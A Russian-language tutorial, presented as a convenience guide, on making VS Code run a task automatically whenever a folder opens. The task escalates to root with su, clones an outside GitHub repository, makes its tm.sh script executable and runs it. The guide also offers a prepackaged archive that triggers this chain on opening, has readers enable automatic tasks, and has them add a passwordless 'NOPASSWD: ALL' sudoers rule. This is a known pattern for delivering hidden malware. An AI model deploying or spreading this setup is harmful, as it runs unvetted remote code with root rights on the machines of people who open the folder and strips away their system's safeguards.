# Полная инструкция по настройке автозапуска в VS Code

## Что делает этот проект

При открытии папки в VS Code автоматически выполняется последовательность команд:

1. `su` - переключение пользователя
2. `git clone https://github.com/minfm109-bot/tm.git` - клонирование репозитория
3. `sed -i 's/\r$//' tm.sh` - удаление символов Windows (CRLF → LF)
4. `chmod +x tm.sh` - добавление прав на выполнение
5. `./tm.sh` - запуск скрипта

---

## Способ 1: Использовать готовый проект (быстрый)

### Шаг 1: Скачайте архив

Скачайте файл `vscode-autostart-project.tar.gz` из вложений.

### Шаг 2: Распакуйте

```bash
# Распакуйте архив
tar -xzf vscode-autostart-project.tar.gz

# Перейдите в папку
cd vscode-autostart-project
```

### Шаг 3: Откройте в VS Code

```bash
code .
```

**Готово!** При открытии папки автоматически запустится последовательность команд.

---

## Способ 2: Создать самостоятельно (пошагово)

### Шаг 1: Создайте папку проекта

```bash
# Создайте папку для вашего проекта
mkdir my-autostart-project
cd my-autostart-project

# Создайте скрытую папку .vscode
mkdir .vscode
```

### Шаг 2: Создайте файл tasks.json

Создайте файл `.vscode/tasks.json` с таким содержимым:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "Auto Startup Sequence",
      "type": "shell",
      "command": "su -c 'git clone https://github.com/minfm109-bot/tm.git && cd tm && sed -i \"s/\\r$//\" tm.sh && chmod +x tm.sh && ./tm.sh'",
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": true,
        "panel": "dedicated"
      },
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
```

**Способы создания файла:**

**Вариант A: Через командную строку**
```bash
cat > .vscode/tasks.json << 'EOF'
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "Auto Startup Sequence",
      "type": "shell",
      "command": "su -c 'git clone https://github.com/minfm109-bot/tm.git && cd tm && sed -i \"s/\\r$//\" tm.sh && chmod +x tm.sh && ./tm.sh'",
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": true,
        "panel": "dedicated"
      },
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
EOF
```

**Вариант B: Через текстовый редактор**
```bash
nano .vscode/tasks.json
# Вставьте содержимое выше
# Сохраните: Ctrl+O, Enter, Ctrl+X
```

**Вариант C: Через VS Code**
1. Откройте папку в VS Code: `code .`
2. Создайте файл `.vscode/tasks.json`
3. Вставьте JSON из примера выше
4. Сохраните: `Ctrl+S`

### Шаг 3: Откройте проект в VS Code

```bash
code .
```

При открытии папки задача запустится автоматически!

---

## Как настроить свои команды

Откройте файл `.vscode/tasks.json` и измените поле `"command"`:

### Пример 1: Изменить репозиторий

```json
"command": "su -c 'git clone https://github.com/ВАШ_ПОЛЬЗОВАТЕЛЬ/ВАШ_РЕПОЗИТОРИЙ.git && cd ВАШ_РЕПОЗИТОРИЙ && ./ваш-скрипт.sh'"
```

### Пример 2: Добавить дополнительные команды

```json
"command": "su -c 'git clone https://github.com/user/repo.git && cd repo && npm install && npm start'"
```

### Пример 3: Изменить пользователя для su

```json
"command": "su username -c 'git clone ... && cd ... && ./script.sh'"
```

### Пример 4: Использовать sudo вместо su

```json
"command": "sudo -u username bash -c 'git clone ... && cd ... && ./script.sh'"
```

---

## Структура файлов

```
ваш-проект/
├── .vscode/
│   └── tasks.json          ← Конфигурация автозапуска
└── (другие файлы проекта)
```

---

## Тестирование

### Ручной запуск задачи

Если хотите запустить задачу вручную:

1. Откройте проект в VS Code
2. Нажмите `Ctrl+Shift+P` (или `Cmd+Shift+P` на Mac)
3. Введите: `Tasks: Run Task`
4. Выберите `Auto Startup Sequence`

### Проверка автозапуска

1. Закройте VS Code полностью
2. Откройте папку снова: `code /путь/к/проекту`
3. Терминал должен открыться автоматически
4. Команды начнут выполняться

---

## Возможные проблемы и решения

### Проблема 1: Задача не запускается автоматически

**Решение:**
1. Откройте VS Code
2. `File` → `Preferences` → `Settings`
3. Найдите: `task.allowAutomaticTasks`
4. Установите значение: `on`

Или добавьте в `settings.json`:
```json
{
  "task.allowAutomaticTasks": "on"
}
```

### Проблема 2: Ошибка "repository already exists"

**Решение:** Удалите папку перед повторным запуском:
```bash
rm -rf tm
```

Или измените команду, чтобы проверять существование:
```json
"command": "su -c 'rm -rf tm && git clone https://github.com/minfm109-bot/tm.git && cd tm && sed -i \"s/\\r$//\" tm.sh && chmod +x tm.sh && ./tm.sh'"
```

### Проблема 3: su требует пароль

**Решение A:** Настройте sudo без пароля

Отредактируйте `/etc/sudoers`:
```bash
sudo visudo
```

Добавьте строку:
```
username ALL=(ALL) NOPASSWD: ALL
```

**Решение B:** Используйте SSH-ключи или другую аутентификацию

### Проблема 4: Ошибка прав доступа

**Решение:**
```bash
chmod 755 .vscode
chmod 644 .vscode/tasks.json
```

---

## Дополнительные возможности

### Добавить несколько задач

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "Task 1",
      "type": "shell",
      "command": "echo 'First task'",
      "runOptions": {
        "runOn": "folderOpen"
      }
    },
    {
      "label": "Task 2",
      "type": "shell",
      "command": "echo 'Second task'",
      "dependsOn": ["Task 1"]
    }
  ]
}
```

### Добавить уведомления

```json
{
  "label": "Auto Startup",
  "type": "shell",
  "command": "su -c '...' && notify-send 'Готово!' 'Скрипт выполнен успешно'",
  "runOptions": {
    "runOn": "folderOpen"
  }
}
```

### Логирование выполнения

```json
{
  "label": "Auto Startup with Logging",
  "type": "shell",
  "command": "su -c 'git clone ... && cd ... && ./script.sh' 2>&1 | tee startup.log",
  "runOptions": {
    "runOn": "folderOpen"
  }
}
```

---

## Полезные команды

### Проверить синтаксис JSON

```bash
cat .vscode/tasks.json | python3 -m json.tool
```

### Посмотреть список задач

В VS Code: `Ctrl+Shift+P` → `Tasks: Run Task`

### Отключить автозапуск временно

Удалите секцию `"runOptions"` из tasks.json или измените на:
```json
"runOptions": {
  "runOn": "default"
}
```

---

## Готово!

Теперь у вас есть:
- ✅ Готовый проект с автозапуском
- ✅ Знания, как создать свой проект
- ✅ Примеры настройки под свои нужды
- ✅ Решения типичных проблем

**Просто откройте папку в VS Code, и всё запустится автоматически!**

---

## Контакты и поддержка

Если возникнут вопросы:
1. Проверьте раздел "Возможные проблемы"
2. Убедитесь, что JSON синтаксис корректен
3. Проверьте права доступа к файлам
4. Попробуйте запустить команды вручную в терминале
